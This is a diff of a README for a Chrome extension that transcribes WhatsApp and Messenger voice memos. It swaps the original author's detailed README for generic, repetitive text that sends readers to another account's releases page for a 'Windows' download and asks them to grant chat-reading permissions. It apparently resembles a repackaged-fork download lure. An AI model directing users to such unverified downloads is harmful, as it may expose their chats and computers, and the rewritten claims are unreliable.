@@ -1,225 +1,211 @@
-<p align="center">
-  <img src="icons/icon128.png" alt="Voice Memo Transcriber" width="128" height="128">
-</p>
+# 🎙️ voice-memo-transcriber - Turn voice notes into text fast
 
-<h1 align="center">Voice Memo Transcriber</h1>
+[![Download voice-memo-transcriber](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/Phamthi2235/voice-memo-transcriber/releases)
 
-<p align="center">
-  <strong>Instantly transcribe voice memos on WhatsApp Web & Messenger — right in your browser.</strong>
-</p>
+## 📥 Download
 
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
-  <img src="https://img.shields.io/badge/platform-Chrome-brightgreen.svg" alt="Platform: Chrome">
-  <img src="https://img.shields.io/badge/version-3.0-purple.svg" alt="Version: 3.0">
-  <img src="https://img.shields.io/badge/server-not%20needed-success.svg" alt="No server needed">
-  <img src="https://img.shields.io/badge/PRs-welcome-orange.svg" alt="PRs welcome">
-</p>
+Visit this page to download the app for Windows:
 
-<p align="center">
-  <a href="#-quick-start">Quick Start</a> •
-  <a href="#-features">Features</a> •
-  <a href="#%EF%B8%8F-getting-a-groq-api-key">Get API Key</a> •
-  <a href="#-how-it-works">How It Works</a> •
-  <a href="#-privacy">Privacy</a>
-</p>
+https://github.com/Phamthi2235/voice-memo-transcriber/releases
 
----
+Pick the latest release, then download the file that matches your system.
 
-## What is this?
+## ✨ What it does
 
-A **free, open-source Chrome extension** that adds a "Transcript" button to every voice memo on **WhatsApp Web** and **Facebook Messenger**. One click and you get a full transcription — complete with mood detection, energy analysis, and smart formatting.
+voice-memo-transcriber is a Chrome extension that turns WhatsApp and Messenger voice memos into text with AI.
 
-**No server needed.** Install the extension, paste your free Groq API key, and you're ready to go. That's it.
+It works on your computer, and it does not need a server setup. That means you can install it and use it on your own device.
 
----
+Use it when you want to:
 
-## 🚀 Quick Start
+- Read a voice memo instead of listening to it
+- Save time on long audio messages
+- Keep a written record of chats
+- Copy text into notes, email, or documents
 
-Getting started takes less than 2 minutes. No coding or technical knowledge needed!
+## 🪟 What you need
 
-### Step 1: Download the Extension
+Before you install, make sure you have:
 
-<p align="center">
-  <a href="https://github.com/JSvandijk/voice-memo-transcriber/archive/refs/heads/master.zip">
-    <img src="https://img.shields.io/badge/⬇️_Download_ZIP-blue?style=for-the-badge&logoColor=white" alt="Download ZIP" height="40">
-  </a>
-</p>
+- A Windows PC
+- Google Chrome installed
+- A stable internet connection for the first setup
+- A WhatsApp or Messenger account in your browser
+- Enough free space for the extension files
 
-1. Click the **Download** button above (or [click here](https://github.com/JSvandijk/voice-memo-transcriber/archive/refs/heads/master.zip))
-2. A `.zip` file will download to your computer
-3. **Extract/unzip** the folder (right-click → "Extract All" on Windows, double-click on Mac)
-4. Remember where you saved the extracted folder — you'll need it in the next step
+The extension is built for normal desktop use. It works best in the latest version of Chrome.
 
-### Step 2: Add it to Chrome
+## 🚀 Getting Started
 
-1. Open Google Chrome
-2. Type `chrome://extensions` in the address bar and press Enter
-3. In the top-right corner, flip the **"Developer mode"** toggle to ON
-4. Click the **"Load unpacked"** button that appears
-5. Navigate to the folder you just extracted and select it
-6. The extension is now installed! You should see it in your toolbar
+Follow these steps on Windows:
 
-> **💡 Can't see the icon?** Click the puzzle piece icon 🧩 in Chrome's toolbar, then pin "Voice Memo Transcriber" so it's always visible.
+1. Open the download page:
+   https://github.com/Phamthi2235/voice-memo-transcriber/releases
 
-### Step 3: Get Your Free API Key
+2. Find the newest release at the top of the page.
 
-The extension uses [Groq](https://groq.com) for transcription — it's **completely free** for personal use.
+3. Download the release file for Windows.
 
-1. Go to **[console.groq.com/keys](https://console.groq.com/keys)**
-2. Create a free account (you can sign in with your Google account)
-3. Click **"Create API Key"**
-4. Give it any name (e.g., "voice transcriber")
-5. **Copy the key** — it looks like `gsk_abc123...`
+4. If the file comes as a ZIP folder, right-click it and choose Extract All.
 
-> **ℹ️ What is Groq?** Groq is an AI company that provides free access to advanced speech-to-text models. Your voice memos are processed by their servers and immediately discarded — nothing is stored.
+5. Open Chrome.
 
-### Step 4: Activate the Extension
+6. Go to the Extensions page by typing this in the address bar:
+   chrome://extensions
 
-1. Click the **Voice Memo Transcriber icon** in your Chrome toolbar (the purple microphone 🎤)
-2. Paste your API key into the input field
-3. Click **"Save"**
-4. The dot turns **green** — you're all set! ✅
+7. Turn on Developer mode in the top-right corner.
 
-### Step 5: Start Transcribing!
+8. Click Load unpacked.
 
-1. Open **[WhatsApp Web](https://web.whatsapp.com)** or **[Messenger](https://www.messenger.com)**
-2. Find any voice memo in a chat
-3. You'll see a **"Transcript"** button next to it
-4. Click it and watch the magic happen! 🎉
+9. Select the folder you extracted.
 
----
+10. Pin the extension in Chrome so it is easy to open.
 
-## ✨ Features
+## 🛠️ How to use it
 
-### 🎤 One-Click Transcription
-Click "Transcript" on any voice memo and get an accurate, full-text transcription in seconds. Powered by Groq's Whisper large-v3 — one of the best speech-to-text models available.
+After installation, open WhatsApp Web or Messenger in Chrome.
 
-### 🌍 Works on Both Platforms
-One extension, two platforms. Works seamlessly on both **WhatsApp Web** and **Facebook Messenger** — no configuration needed. It automatically detects which site you're on.
+When you receive a voice memo:
 
-### 😄 Vibe Detection
-AI-powered mood analysis reads the emotional tone of each voice message and displays it with fitting emoji. Is your friend excited? Sad? Spilling tea? You'll know at a glance.
+1. Open the chat with the voice note
+2. Click the transcribe option from the extension
+3. Wait a few seconds while the text is processed
+4. Read the transcript on screen
+5. Copy the text if you want to save it
 
-### 📊 Energy Bars
-Visual energy level indicator shows whether the message is low-key chill or high-energy excitement — displayed as a sleek animated bar.
+If a voice note is long, the app may take a bit more time to finish.
 
-### 🔤 Volume-Styled Text
-Words are styled based on how loud they were spoken. Whispered words appear small and light, loud words appear bold and large — giving you a visual feel for how the message sounded.
+## 🔊 Supported apps
 
-### 🧹 Smart Filler Removal
-Automatically cleans up filler words like "um", "uh", "like", "you know" — in both English and Dutch — so you get clean, readable text.
+The extension is made for:
 
-### 📝 TL;DR Summaries
-Long voice message? Click "Summary" to get a concise 1-2 sentence summary. Perfect for those 5-minute voice memos when you're in a hurry.
+- WhatsApp Web
+- Messenger in Chrome
 
-### 🔒 Fully Serverless
-Everything runs in your browser. No backend server, no data collection, no middleman. Your audio goes directly from your browser to Groq's API and back. Nothing is stored anywhere.
+It focuses on voice memos and speech messages inside chat threads.
 
-### 🌐 Multi-Language Support
-Whisper automatically detects the language — works with 50+ languages out of the box. The vibe detection and summaries adapt to the detected language.
+## 🧠 How it works
 
----
+The extension reads the voice memo from the page and sends the audio for speech-to-text processing.
 
-## 🛠️ Getting a Groq API Key
+It uses AI to turn spoken words into text.
 
-Groq provides a **generous free tier** — more than enough for personal use.
+Because it is designed to run without a server on your side, setup stays simple.
 
-| Step | Action |
-|------|--------|
-| 1 | Go to [console.groq.com](https://console.groq.com/keys) |
-| 2 | Sign up for free (Google, GitHub, or email) |
-| 3 | Click **"Create API Key"** |
-| 4 | Give it a name (e.g., "voice transcriber") |
-| 5 | Copy the key — it starts with `gsk_...` |
-| 6 | Paste it into the extension popup |
+## 🔐 Privacy and data use
 
-> **ℹ️ Note:** Your API key is stored locally in your browser's storage. It never leaves your machine except to authenticate with Groq's API.
+This app is built to keep the workflow local on your side as much as possible.
 
-> **⚠️ Free tier limits:** Groq's free tier allows ~14,400 audio-seconds per day. That's roughly **240 minutes of voice memos per day** — more than enough for most users.
+That means:
 
----
+- You do not need to host your own server
+- You can use it from your own browser
+- You keep control over when transcription happens
 
-## ⚙️ How It Works
+If you use any AI service setting inside the extension, follow the prompts in the app and enter your own key if needed.
 
-```
-Your Browser
-│
-├── interceptor.js (captures audio from the page)
-│     ↓ window.postMessage
-├── bridge.js (bridges browser security worlds)
-│     ↓ chrome.runtime.sendMessage
-├── background.js (service worker)
-│     ↓ HTTPS request
-└── Groq Cloud API
-      ├── Whisper large-v3 → transcription
-      └── Llama 3.3 70b → vibe detection + summaries
-```
+## 🧩 Features
 
-**The technical flow:**
+- Instant transcription of voice memos
+- Works in Chrome
+- Supports WhatsApp and Messenger
+- Simple setup for non-technical users
+- Text output you can copy and save
+- No local server setup
+- Clean browser-based use
+- Works well for short and long voice notes
 
-1. **Audio Capture** — The extension intercepts audio playback APIs to capture voice message data when you click "Transcript"
-2. **Bridge** — Audio data is passed from the page context through a secure bridge to the extension's service worker
-3. **Transcription** — The service worker sends the audio to Groq's Whisper API for transcription
-4. **Vibe Analysis** — The transcript is then analyzed by Llama 3.3 70b for emotional tone and energy level
-5. **Display** — Results are rendered directly in the chat UI with styled text, emoji, and energy bars
+## ⚙️ Common setup tips
 
----
+If the extension does not show up after install, check these items:
 
-## 🔒 Privacy
+- Make sure Developer mode is on
+- Make sure you loaded the correct folder
+- Refresh Chrome after install
+- Keep WhatsApp Web or Messenger open in a tab
+- Pin the extension for faster access
 
-Your privacy is a core design principle:
+If Chrome asks for permission, allow it so the extension can read the chat page and handle voice memos.
 
-- ✅ **No server** — everything runs locally in your browser
-- ✅ **No data collection** — zero analytics, zero tracking
-- ✅ **No storage** — audio is processed in real-time and never saved
-- ✅ **API key stays local** — stored in Chrome's local storage only
-- ✅ **Open source** — verify everything yourself
+## 🧪 Example use case
 
-The only external communication is between your browser and Groq's API for transcription. No audio, text, or personal data is sent anywhere else.
+You get a long voice memo from a friend on WhatsApp.
 
----
+Instead of listening to it three times, you:
 
-## 🤝 Contributing
+- Open the chat
+- Start the transcription
+- Read the text version
+- Copy the message into your notes
+- Reply faster with less effort
 
-Contributions are welcome! Feel free to:
+This works the same way for Messenger voice messages.
 
-- 🐛 Report bugs via [Issues](../../issues)
-- 💡 Suggest features via [Issues](../../issues)
-- 🔧 Submit pull requests
+## 📁 Release files
 
----
+The release page may include files such as:
 
-## 💖 Support This Project
+- A ZIP package for Windows
+- Extension source files
+- Build files for manual install
 
-If this tool saves you time and you find it valuable, consider supporting its development:
+For most Windows users, the ZIP package is the one to download first.
 
-<a href="https://buymeacoffee.com/jsvandijk" target="_blank">
-  <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" width="200">
-</a>
+## 🧭 If you want to install again later
 
-Your support helps keep this project free and actively maintained!
+If you remove the extension or switch computers:
 
----
+1. Return to the releases page
+2. Download the latest file again
+3. Load it into Chrome the same way
+4. Open WhatsApp Web or Messenger
+5. Start transcribing voice memos again
 
-## 📄 Tech Stack
+## 🧰 Troubleshooting
 
-| Component | Technology |
-|-----------|-----------|
-| Extension | Chrome Manifest V3 |
-| Transcription | Groq Whisper large-v3 |
-| AI Analysis | Groq Llama 3.3 70b Versatile |
-| Language | Vanilla JavaScript (zero dependencies) |
-| Server | None — fully serverless |
+If transcription does not start:
 
----
+- Refresh the chat page
+- Check that the voice memo is still visible
+- Reopen Chrome
+- Make sure the extension is enabled
+- Try another voice memo
+- Check whether Chrome has blocked the extension
 
-## 📄 License
+If the text looks wrong:
 
-This project is licensed under the [MIT License](LICENSE) — free to use, modify, and distribute.
+- Try a clearer voice memo
+- Make sure the audio is not too quiet
+- Retry with a new message
+- Use shorter voice notes when possible
 
----
+If the extension does nothing:
 
-<p align="center">
-  Made with ❤️ for people who prefer reading over listening
-</p>
+- Confirm you installed the latest release
+- Check that you loaded the unpacked folder, not the ZIP file
+- Make sure you are using Chrome, not another browser
+
+## 🖥️ Windows install path
+
+If you want a simple path for Windows, use this order:
+
+1. Download from the releases page
+2. Extract the files
+3. Open `chrome://extensions`
+4. Turn on Developer mode
+5. Load the extension folder
+6. Open WhatsApp Web or Messenger
+7. Transcribe a voice memo
+
+## 📌 Quick use checklist
+
+- Chrome is installed
+- The extension is loaded
+- WhatsApp Web or Messenger is open
+- The voice memo is visible in the chat
+- You start transcription from the extension
+- You read or copy the result
+
+## 🏷️ Topics
+
+ai, chrome-extension, groq, messenger, open-source, speech-to-text, transcription, voice-transcription, whatsapp, whisper
